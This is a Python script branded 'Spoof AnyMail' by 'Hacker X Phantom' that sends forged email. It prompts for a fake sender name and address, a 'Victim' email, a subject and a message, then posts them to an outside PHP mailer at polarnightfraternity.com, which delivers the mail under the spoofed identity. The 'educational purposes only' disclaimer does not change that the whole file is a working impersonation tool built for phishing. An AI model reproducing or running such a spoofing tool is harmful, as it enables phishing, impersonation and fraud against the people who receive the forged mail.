import os
import sys
import time
from os import system
from time import sleep

#This script is developed ls Hacker X Phantom.
#This is created for educational purposes only.

try:
    import requests
except ImportError:
    os.system('apt-get install python3')
    os.system('pip3 install requests')

try:
	request = requests.get("https://www.google.com/search?q=freemailsender.com", timeout=3)
except (requests.ConnectionError, requests.Timeout) as exception:
    print("[!] Oops, It looks like you have no Internet [!]")
    sys.exit()

import requests

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
W = '\033[1;37m'

def hprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8.0 / 100)

logo = """

\033[1;35m
   _____                   ____   ___                __  ___      _ __
  / ___/____  ____  ____  / __/  /   |  ____  __  __/  |/  /___ _(_) /
  \__ \/ __ \/ __ \/ __ \/ /_   / /| | / __ \/ / / / /|_/ / __ `/ / / 
 ___/ / /_/ / /_/ / /_/ / __/  / ___ |/ / / / /_/ / /  / / /_/ / / /  
/____/ .___/\____/\____/_/    /_/  |_/_/ /_/\__, /_/  /_/\__,_/_/_/   
    /_/                                    /____/                     


\033[1;31m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m [\033[1;33m+\033[1;32m]\033[1;36m DEVELOPED By \033[1;31m(\033[1;33mHacker XPhantom\033[1;31m)~~~~~~~|
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m [\033[1;33m+\033[1;32m]\033[1;36m Join Us \033[1;31m(\033[1;33mhttps://bit.ly/3PV3S3r\033[1;31m)~~~~~|
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
system("clear")
print (logo)
hprint(G + ' Starting Spoof AnyMail for Sending Emails ...')
sleep(2)
print ("")
name = input(C + " Enter Sender's Name" + Y + " --> " + G)
print ("")
sender = input(C + " Enter Sender's Email" + Y + " --> " + G)
print("")
receiver = input(C + " Enter Victim  Email" + Y + " --> " + G)
print ("")
subject = input(C + " Enter Subject" + Y + " --> " + G)
print ("")
body = input(C + " Enter the Message" + Y + " --> " + G)
print("")

files = {
    'name': (None, name),
    'subject': (None, subject),
    'email': (None, receiver),
    'from': (None, sender),
    'message': (None, body),
    'submit': (None, "submit"),
}
response = requests.post('https://polarnightfraternity.com/spoofy/spoofy.php', files=files)
hprint(C + ' Sending email to ' + receiver + ' ...')
print("")
print(G + " " + response.text)
